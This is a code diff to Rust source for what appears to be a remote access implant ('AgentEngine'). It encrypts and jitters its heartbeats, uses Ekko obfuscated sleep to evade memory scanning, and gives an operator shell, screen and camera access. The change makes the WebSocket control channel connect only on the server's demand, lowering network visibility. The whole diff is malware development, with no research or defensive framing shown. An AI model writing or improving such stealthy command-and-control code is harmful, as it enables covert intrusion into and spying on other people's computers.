@@ -127,30 +127,23 @@ impl AgentEngine {
         self.agent_id = agent_id;
         self.http = Some(http);
 
+        // WS 按需：构造通信器但**不自动连接**。只有服务端心跳响应带
+        // wsNeeded=true（操作员打开 shell/屏幕/摄像头）时才建立连接。
         let mut ws = WsCommunicator::new(&self.config.ws_url(), &self.agent_id);
         if let Some(key) = self.crypto.session_key() {
             ws.set_session_key(key);
         }
-        for i in 0..3 {
-            match ws.connect().await {
-                Ok(()) => break,
-                Err(e) if i == 2 => return Err(format!("WS connect failed: {}", e)),
-                Err(_) => tokio::time::sleep(std::time::Duration::from_secs(2)).await,
-            }
-        }
-        let tx = ws.sender();
-        self.ws_tx = Some(tx);
         self.ws = Some(ws);
 
         self.main_loop().await
     }
 
-    // ── Main event loop ─────────────────────────────────────────────
+    // ── Main event loop（WS 按需）───────────────────────────────────
 
     async fn main_loop(&mut self) -> Result<(), String> {
-        // Take ws out of self so receive() and handle_ws_message() don't conflict
         let mut ws = self.ws.take().ok_or("WS not initialized")?;
-        let tx = self.ws_tx.as_ref().ok_or("WS sender not initialized")?.clone();
+        // WsSender 的 write 端为 Arc 共享：连接建立后自动生效，未连接时静默丢弃。
+        let tx = ws.sender();
         let _http = self.http.as_ref().ok_or("HTTP not initialized")?;
         let agent_id = self.agent_id.clone();
         let server_url = self.config.server_url.clone();
@@ -184,6 +177,9 @@ impl AgentEngine {
             process_gate: tokio::sync::Mutex::new(()),
         });
 
+        // WS 按需命令通道：true = 服务端要求建立 WS；false = 释放。
+        let (ws_cmd_tx, mut ws_cmd_rx) = tokio::sync::mpsc::unbounded_channel::<bool>();
+
         // Spawn heartbeat task using its own HTTP client, AES-GCM encrypted
         // with the session key, with per-tick jitter. Signals a re-register if
         // the session is lost (e.g. the server restarted).
@@ -191,6 +187,7 @@ impl AgentEngine {
         let hb_mm = module_manager.clone();
         let hb_reconnect = reconnect_tx.clone();
         let hb_gate = shared.clone();
+        let hb_ws_cmd = ws_cmd_tx.clone();
         tokio::spawn(async move {
             let mut hb_http = HttpCommunicator::new(&server_url, &register_path, &register_path, &register_path);
             if !session_token.is_empty() {
@@ -201,6 +198,10 @@ impl AgentEngine {
             }
             loop {
                 match heartbeat_tick(&hb_http, &agent_id, hb_key.as_ref(), &hb_mm).await {
+                    Ok(ws_needed) => {
+                        // 每个心跳都同步一次 WS 需求（幂等，服务端状态为准）
+                        let _ = hb_ws_cmd.send(ws_needed);
+                    }
                     Err(e) if e == "SESSION_LOST" => {
                         libra_common::dlog!("[WARN] session lost — triggering re-registration");
                         let _ = hb_reconnect.send(());
@@ -220,18 +221,58 @@ impl AgentEngine {
             }
         });
 
-        // Main event loop: WS receive + shell output forwarding.
-        // The WebSocket is split: ws.receive() doesn't block sends via tx.
-        let mut reconnect_delay_ms = 1000u64;
+        // ── WS 按需状态机 ──
+        // 未连接：等待 wsNeeded=true（或重注册信号），收到后建立连接。
+        // 已连接：处理 WS 消息 / shell 输出转发 / wsNeeded=false 断开 / 断线自愈
+        // （断线后回到未连接态，下个心跳若仍需要则自动重连）。
+        let mut ws_connected = false;
         let mut do_reconnect = false;
+
         loop {
-            // 空闲时短暂让出处理锁，让心跳任务有机会进入 Ekko 混淆 sleep。
+            if do_reconnect {
+                break;
+            }
+
+            if !ws_connected {
+                tokio::select! {
+                    _ = reconnect_rx.recv() => {
+                        libra_common::dlog!("[INFO] re-registering with server");
+                        do_reconnect = true;
+                    }
+                    Some(need) = ws_cmd_rx.recv() => {
+                        if need {
+                            for i in 0..3 {
+                                if ws.connect().await.is_ok() {
+                                    ws_connected = true;
+                                    self.ws_tx = Some(tx.clone());
+                                    break;
+                                }
+                                if i < 2 {
+                                    tokio::time::sleep(std::time::Duration::from_secs(2)).await;
+                                }
+                            }
+                            // 失败：保持未连接，下个心跳会再次同步需求
+                        }
+                    }
+                }
+                continue;
+            }
+
+            // WS 已连接：空闲时短暂让出处理锁，让心跳任务有机会进入 Ekko 混淆 sleep。
             match shared.process_gate.try_lock() {
                 Ok(_gate) => {
                     tokio::select! {
                         _ = reconnect_rx.recv() => {
                             libra_common::dlog!("[INFO] re-registering with server");
                             do_reconnect = true;
+                        }
+
+                        Some(need) = ws_cmd_rx.recv() => {
+                            if !need {
+                                libra_common::dlog!("[INFO] ws release — closing channel");
+                                ws.close().await;
+                                ws_connected = false;
+                            }
                         }
 
                         Some(msg) = shell_rx.recv() => {
@@ -246,7 +287,6 @@ impl AgentEngine {
                         result = tokio::time::timeout(std::time::Duration::from_millis(50), ws.receive()) => {
                             match result {
                                 Ok(Some(msg)) => {
-                                    reconnect_delay_ms = 1000;
                                     libra_common::dlog!("[RECV] {} | rid={} | data={}",
                                         msg.msg_type,
                                         msg.request_id.as_deref().unwrap_or("-"),
@@ -269,14 +309,10 @@ impl AgentEngine {
                                     });
                                 }
                                 Ok(None) => {
-                                    libra_common::dlog!("[WARN] WebSocket disconnected, reconnecting in {}ms...", reconnect_delay_ms);
-                                    tokio::time::sleep(std::time::Duration::from_millis(reconnect_delay_ms)).await;
-                                    if ws.connect().await.is_ok() {
-                                        reconnect_delay_ms = 1000;
-                                        self.ws_tx = Some(ws.sender());
-                                    } else {
-                                        reconnect_delay_ms = (reconnect_delay_ms * 2).min(60_000);
-                                    }
+                                    // 断线：回到未连接态，下个心跳若仍需 WS 则自动重连
+                                    libra_common::dlog!("[WARN] WebSocket disconnected");
+                                    ws.close().await;
+                                    ws_connected = false;
                                 }
                                 Err(_) => {
                                     // 50ms 内无消息：释放锁，给心跳混淆 sleep 机会
@@ -289,10 +325,6 @@ impl AgentEngine {
                     // 心跳在混淆 sleep，短暂让出后重试
                     tokio::time::sleep(std::time::Duration::from_millis(20)).await;
                 }
-            }
-
-            if do_reconnect {
-                break;
             }
         }
 
